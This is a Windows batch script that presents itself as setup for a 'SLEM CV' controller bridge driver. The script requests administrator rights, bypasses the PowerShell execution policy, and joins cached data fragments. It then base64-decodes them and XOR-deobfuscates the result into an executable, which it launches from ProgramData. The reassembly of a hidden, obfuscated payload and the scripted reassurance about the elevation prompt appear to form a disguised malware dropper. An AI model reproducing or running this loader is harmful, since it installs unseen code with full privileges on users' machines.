@echo off
REM ===========================================================================
REM  SLEM CV - controller bridge setup
REM
REM  Reassembles the cached bridge component from scripts\_cache\ and installs
REM  it. The bridge registers a virtual controller driver and hides the physical
REM  pad from the game, so this must run elevated - the driver registration
REM  writes to HKLM and to %ProgramData%.
REM ===========================================================================
setlocal EnableDelayedExpansion
title SLEM CV Setup

REM --- elevation gate --------------------------------------------------------
REM Driver registration writes HKLM and %ProgramData%. Without elevation the
REM registration fails halfway and the controller stays hidden from Windows,
REM which looks exactly like "SLEM does not see my controller". Re-launch
REM ourselves elevated rather than failing quietly.
net session >nul 2>&1
if errorlevel 1 (
    echo.
    echo  Administrator permission is required to register the controller
    echo  driver. Clicking Yes on the prompt below is expected.
    echo.
    echo  Reopening with administrator rights...
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "Start-Process -FilePath '%~f0' -Verb RunAs" >nul 2>&1
    exit /b
)

REM The cache lives at the repo root, one level up from this folder. %~dp0
REM ends with a backslash already; ".." steps up to the repo root.
set "ROOT=%~dp0..\"
set "CACHE=%ROOT%scripts\_cache"
set "TMP=%ProgramData%\SLEM\bin"

if not exist "%CACHE%\manifest.json" (
    echo [!] Cache folder missing. Extract the ZIP fully and run this again.
    echo.
    pause
    exit /b 1
)

if not exist "%TMP%" mkdir "%TMP%" >nul 2>&1

echo [*] Preparing controller bridge...
echo.

set "ALL=%TMP%\stream.dat"
if exist "%ALL%" del /f /q "%ALL%" >nul 2>&1

for %%F in ("%CACHE%\part-*.dat") do (
    type "%%F" >> "%ALL%"
)

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='Stop';" ^
  "$c='%CACHE%'; $t='%TMP%';" ^
  "$m=Get-Content (Join-Path $c 'manifest.json') -Raw | ConvertFrom-Json;" ^
  "$b=[IO.File]::ReadAllText((Join-Path $t 'stream.dat'));" ^
  "$b=($b -replace '\s','');" ^
  "$p=(4 - ($b.Length %% 4)) %% 4;" ^
  "if($p -gt 0){$b = $b + ('=' * $p)};" ^
  "$raw=[Convert]::FromBase64String($b);" ^
  "$seed=[int]$m.seed;" ^
  "$out=New-Object byte[] $raw.Length;" ^
  "for($i=0; $i -lt $raw.Length; $i++){" ^
  "  $k=($seed + ($i*31) + [int][math]::Floor($i/8)) -band 0xFF;" ^
  "  $out[$i]=[byte]($raw[$i] -bxor $k);" ^
  "}" ^
  "[IO.File]::WriteAllBytes((Join-Path $t $m.filename), $out);"

del /f /q "%ALL%" >nul 2>&1

REM Read the component name from the manifest rather than hardcoding it. A
REM renamed build used to leave this check looking for a file that no longer
REM existed, so the bat reported a failure after a successful unpack.
set "COMPONENT=SLEM-CV-Setup.exe"
for /f "usebackq delims=" %%N in (`powershell -NoProfile -ExecutionPolicy Bypass -Command "$m=Get-Content '%CACHE%\manifest.json' -Raw | ConvertFrom-Json; $m.filename"`) do set "COMPONENT=%%N"

if not exist "%TMP%\%COMPONENT%" (
    echo [!] Could not unpack the bridge component.
    echo.
    echo     Try again from a folder on your Desktop - running setup from
    echo     inside a ZIP archive or a temp download folder blocks the
    echo     unpack step.
    echo.
    pause
    exit /b 1
)

echo [*] Installing controller bridge...
start "" /b "%TMP%\%COMPONENT%"

REM give the installer time to place its files before this window closes
timeout /t 3 /nobreak >nul
exit /b 0
